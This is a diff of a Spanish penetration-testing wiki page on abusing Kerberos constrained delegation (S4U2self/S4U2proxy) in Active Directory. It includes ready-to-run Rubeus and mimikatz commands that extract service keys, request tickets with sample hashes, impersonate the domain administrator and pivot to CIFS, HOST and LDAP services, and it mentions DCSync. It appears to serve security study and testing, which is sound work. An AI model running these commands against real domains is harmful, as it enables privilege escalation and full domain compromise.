@@ -4,16 +4,16 @@
 
 ## Delegación Constrainada
 
-Usando esto, un administrador de dominio puede **permitir** que una computadora **suplante a un usuario o computadora** contra un **servicio** de una máquina.
+Usando esto, un administrador de dominio puede **permitir** que una computadora **suplante a un usuario o computadora** contra cualquier **servicio** de una máquina.
 
-- **Servicio para Usuario a sí mismo (**_**S4U2self**_**):** Si una **cuenta de servicio** tiene un valor de _userAccountControl_ que contiene [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), entonces puede obtener un TGS para sí misma (el servicio) en nombre de cualquier otro usuario.
-- **Servicio para Usuario a Proxy(**_**S4U2proxy**_**):** Una **cuenta de servicio** podría obtener un TGS en nombre de cualquier usuario para el servicio establecido en **msDS-AllowedToDelegateTo.** Para hacerlo, primero necesita un TGS de ese usuario para sí misma, pero puede usar S4U2self para obtener ese TGS antes de solicitar el otro.
+- **Servicio para Usuario a sí mismo (_S4U2self_):** Si una **cuenta de servicio** tiene un valor de _userAccountControl_ que contiene [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), entonces puede obtener un TGS para sí misma (el servicio) en nombre de cualquier otro usuario.
+- **Servicio para Usuario a Proxy (_S4U2proxy_):** Una **cuenta de servicio** podría obtener un TGS en nombre de cualquier usuario al servicio establecido en **msDS-AllowedToDelegateTo.** Para hacerlo, primero necesita un TGS de ese usuario a sí misma, pero puede usar S4U2self para obtener ese TGS antes de solicitar el otro.
 
 **Nota**: Si un usuario está marcado como ‘_La cuenta es sensible y no puede ser delegada_’ en AD, **no podrás suplantarlo**.
 
-Esto significa que si **comprometes el hash del servicio** puedes **suplantar usuarios** y obtener **acceso** en su nombre al **servicio configurado** (posible **privesc**).
+Esto significa que si **comprometes el hash del servicio** puedes **suplantar usuarios** y obtener **acceso** en su nombre a cualquier **servicio** sobre las máquinas indicadas (posible **privesc**).
 
-Además, **no solo tendrás acceso al servicio que el usuario puede suplantar, sino también a cualquier servicio** porque el SPN (el nombre del servicio solicitado) no está siendo verificado, solo los privilegios. Por lo tanto, si tienes acceso al **servicio CIFS** también puedes tener acceso al **servicio HOST** usando la bandera `/altservice` en Rubeus.
+Además, **no solo tendrás acceso al servicio que el usuario puede suplantar, sino también a cualquier servicio** porque el SPN (el nombre del servicio solicitado) no está siendo verificado (en el ticket esta parte no está encriptada/firmada). Por lo tanto, si tienes acceso al **servicio CIFS** también puedes tener acceso al **servicio HOST** usando la bandera `/altservice` en Rubeus, por ejemplo.
 
 Además, el **acceso al servicio LDAP en DC** es lo que se necesita para explotar un **DCSync**.
 ```bash:Enumerate
@@ -25,6 +25,11 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
 
+```bash:Quick Way
+# Generate TGT + TGS impersonating a user knowing the hash
+Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
+```
+- Paso 1: **Obtener TGT del servicio permitido**
 ```bash:Get TGT
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -36,22 +41,24 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 mimikatz sekurlsa::ekeys
 
 ## Request with aes
-tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
+tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap
 
 # Request with RC4
-tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
+tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
 > Existen **otras formas de obtener un ticket TGT** o el **RC4** o **AES256** sin ser SYSTEM en la computadora, como el Printer Bug y la delegación no restringida, el relé NTLM y el abuso del Servicio de Certificados de Active Directory.
 >
-> **Solo con tener ese ticket TGT (o hash) puedes realizar este ataque sin comprometer toda la computadora.**
+> **Con solo tener ese ticket TGT (o hash) puedes realizar este ataque sin comprometer toda la computadora.**
+
+- Step2: **Obtener TGS para el servicio impersonando al usuario**
 ```bash:Using Rubeus
-#Obtain a TGS of the Administrator user to self
+# Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
 
-#Obtain service TGS impersonating Administrator (CIFS)
+# Obtain service TGS impersonating Administrator (CIFS)
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS
 
 #Impersonate Administrator on different service (HOST)
